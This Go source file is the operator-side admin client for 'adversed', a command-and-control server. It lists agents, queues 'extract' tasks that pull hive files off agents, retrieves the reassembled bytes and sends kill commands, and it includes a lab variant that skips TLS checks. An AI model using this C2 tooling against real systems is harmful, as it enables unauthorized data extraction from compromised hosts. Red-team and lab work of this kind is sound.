// Package adminapi is the operator-side HTTP client for the adversed admin
// API (/admin/v1/*). It is used by the adversed CLI (task, list, results,
// kill, status) and can be used to script operator workflows.
//
// All endpoints require a bearer operator token configured on the server.
// The client never logs tokens or hive contents.
package adminapi

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// AdminPrefix is the path prefix of the admin API on the C2 listener.
const AdminPrefix = "/admin/v1"

// maxResponseBytes bounds the admin API response body read by the client.
//
// Mirrors the server's MaxBytesPerJob (512 MB, internal/server/server.go)
// rather than importing internal/server: adminapi is a leaf client used by the
// operator CLI and must not pull in the server runtime. A 512 MB reassembled
// job becomes ~683 MB after base64 encoding in the JSON response, plus result
// entries; 1 GiB leaves headroom. Reads are capped explicitly so an oversized
// body returns a clear error instead of being silently truncated (which
// surfaces later as a JSON unmarshal failure in `adversed results --out`).
//
// It is a var (not a const) only so tests can lower the bound.
var maxResponseBytes int64 = 1 << 30 // 1 GiB

// Health is the GET /health response.
type Health struct {
	Status        string  `json:"status"`
	Version       string  `json:"version"`
	UptimeSeconds float64 `json:"uptime_s"`
	Agents        int     `json:"agents"`
	OnlineAgents  int     `json:"online_agents"`
	QueuedTasks   int     `json:"queued_tasks"`
	ResultsStored int     `json:"results_stored"`
}

// AgentInfo is one row of GET /agents.
type AgentInfo struct {
	AgentID      string  `json:"agent_id"`
	LastSeen     float64 `json:"last_seen"`
	Online       bool    `json:"online"`
	KillEpoch    uint64  `json:"kill_epoch"`
	PendingTasks int     `json:"pending_tasks"`
}

// TaskInfo is one row of GET /tasks.
type TaskInfo struct {
	ID           string         `json:"id"`
	AgentID      string         `json:"agent_id"`
	Action       string         `json:"action"`
	Payload      map[string]any `json:"payload,omitempty"`
	State        string         `json:"state"`
	CreatedAt    string         `json:"created_at"`
	DispatchedAt string         `json:"dispatched_at,omitempty"`
	AckedAt      string         `json:"acked_at,omitempty"`
	CompletedAt  string         `json:"completed_at,omitempty"`
	Retries      int            `json:"retries"`
	Error        string         `json:"error,omitempty"`
}

// EnqueueTaskRequest is the POST /tasks body.
type EnqueueTaskRequest struct {
	AgentID   string   `json:"agent_id"`
	Action    string   `json:"action"` // extract | sleep | noop
	Hives     []string `json:"hives,omitempty"`
	JobID     string   `json:"job_id,omitempty"`
	ChunkSize int      `json:"chunk_size,omitempty"`
	Seconds   int      `json:"seconds,omitempty"`
}

// EnqueueTaskResponse is the POST /tasks response.
type EnqueueTaskResponse struct {
	TaskID string `json:"task_id"`
}

// KillRequest is the POST /kill body.
type KillRequest struct {
	AgentID string `json:"agent_id"`
	Payload string `json:"payload"` // "kill" or "kill_switch"
}

// KillResponse is the POST /kill response.
type KillResponse struct {
	TaskID string `json:"task_id"`
	Epoch  uint64 `json:"epoch"`
}

// ResultEntry is one stored result row.
type ResultEntry struct {
	TaskID  string  `json:"task_id"`
	Payload string  `json:"payload"`
	Ts      float64 `json:"ts"`
}

// ResultsResponse is the GET /results response. Reassembled maps hive name to
// base64-encoded reassembled hive bytes for completed jobs.
type ResultsResponse struct {
	Agent       string            `json:"agent"`
	Task        string            `json:"task,omitempty"`
	Results     []ResultEntry     `json:"results"`
	Reassembled map[string]string `json:"reassembled,omitempty"`
	Complete    bool              `json:"complete"`
}

// ErrorResponse is the body returned on HTTP errors.
type ErrorResponse struct {
	Error string `json:"error"`
}

// Client is an authenticated admin API client.
type Client struct {
	baseURL string
	token   string
	http    *http.Client
}

// NewClient builds a client from the C2 server URL and operator token.
// serverURL is the https URL of the C2 listener (scheme://host:port).
func NewClient(serverURL, token string) *Client {
	base := strings.TrimRight(serverURL, "/") + AdminPrefix
	return &Client{
		baseURL: base,
		token:   token,
		http:    &http.Client{Timeout: 15 * time.Second},
	}
}

// NewInsecureClient is the lab variant that accepts self-signed C2 TLS certs.
func NewInsecureClient(serverURL, token string) *Client {
	c := NewClient(serverURL, token)
	c.http.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12, InsecureSkipVerify: true},
	}
	return c
}

func (c *Client) do(ctx context.Context, method, path string, body any, out any) error {
	var reader io.Reader
	if body != nil {
		raw, err := json.Marshal(body)
		if err != nil {
			return fmt.Errorf("marshal request: %w", err)
		}
		reader = bytes.NewReader(raw)
	}
	req, err := http.NewRequestWithContext(ctx, method, c.baseURL+path, reader)
	if err != nil {
		return fmt.Errorf("build request: %w", err)
	}
	if c.token != "" {
		req.Header.Set("Authorization", "Bearer "+c.token)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.http.Do(req)
	if err != nil {
		return fmt.Errorf("request %s %s: %w", method, path, err)
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseBytes+1))
	if err != nil {
		return fmt.Errorf("read response: %w", err)
	}
	if int64(len(data)) > maxResponseBytes {
		return fmt.Errorf("response exceeds %d byte limit (job/hive too large to fetch in one request)", maxResponseBytes)
	}
	if resp.StatusCode != http.StatusOK {
		var e ErrorResponse
		if err := json.Unmarshal(data, &e); err == nil && e.Error != "" {
			return fmt.Errorf("server error (%d): %s", resp.StatusCode, e.Error)
		}
		return fmt.Errorf("server error: HTTP %d: %s", resp.StatusCode, truncate(string(data), 200))
	}
	if out == nil {
		return nil
	}
	if err := json.Unmarshal(data, out); err != nil {
		return fmt.Errorf("decode response: %w", err)
	}
	return nil
}

// Health fetches server health.
func (c *Client) Health(ctx context.Context) (*Health, error) {
	var h Health
	if err := c.do(ctx, http.MethodGet, "/health", nil, &h); err != nil {
		return nil, err
	}
	return &h, nil
}

// Agents lists agents and their status.
func (c *Client) Agents(ctx context.Context) ([]AgentInfo, error) {
	var out []AgentInfo
	if err := c.do(ctx, http.MethodGet, "/agents", nil, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// Tasks lists task lifecycle records, optionally filtered by agent.
func (c *Client) Tasks(ctx context.Context, agentID string) ([]TaskInfo, error) {
	path := "/tasks"
	if agentID != "" {
		path += "?agent=" + url.QueryEscape(agentID)
	}
	var out []TaskInfo
	if err := c.do(ctx, http.MethodGet, path, nil, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// EnqueueTask queues a task and returns its task ID.
func (c *Client) EnqueueTask(ctx context.Context, req EnqueueTaskRequest) (string, error) {
	var resp EnqueueTaskResponse
	if err := c.do(ctx, http.MethodPost, "/tasks", req, &resp); err != nil {
		return "", err
	}
	if resp.TaskID == "" {
		return "", fmt.Errorf("server returned empty task_id")
	}
	return resp.TaskID, nil
}

// Kill enqueues a signed kill and returns its epoch.
func (c *Client) Kill(ctx context.Context, req KillRequest) (*KillResponse, error) {
	var resp KillResponse
	if err := c.do(ctx, http.MethodPost, "/kill", req, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

// Results fetches stored results, optionally restricted to one task. When
// reassembled is true the server also returns reassembled hive bytes for
// completed jobs.
func (c *Client) Results(ctx context.Context, agentID, taskID string, reassembled bool) (*ResultsResponse, error) {
	path := "/results?agent=" + url.QueryEscape(agentID)
	if taskID != "" {
		path += "&task=" + url.QueryEscape(taskID)
	}
	if reassembled {
		path += "&reassembled=1"
	}
	var out ResultsResponse
	if err := c.do(ctx, http.MethodGet, path, nil, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
